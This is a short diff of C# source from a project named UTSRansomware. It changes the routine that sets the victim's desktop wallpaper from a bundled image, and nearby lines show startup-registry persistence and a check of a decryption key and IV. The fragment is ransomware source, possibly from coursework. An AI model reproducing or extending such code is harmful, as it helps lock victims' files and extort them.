@@ -49,12 +49,18 @@ namespace UTSRansomware
             startupKey.SetValue(appName, appPath);
         }
 
-        // Sets desktop background from file path
-        public static void SetDesktopBackground(string filePath)
+        public static void SetDesktopBackground()
         {
+            // Determine the current application's directory.
+            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
+
+            // Append the file name to this directory.
+            string fullPath = Path.Combine(appDirectory, "DesktopBG.jpg");
+
             // Call SystemParametersInfo function to set the desktop wallpaper
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, fullPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
         }
+
 
         // Reads key and iv from user, checks to see if it matches the encryptor instance
         public static bool ValidateKeyAndIv(byte[] key, byte[] iv)
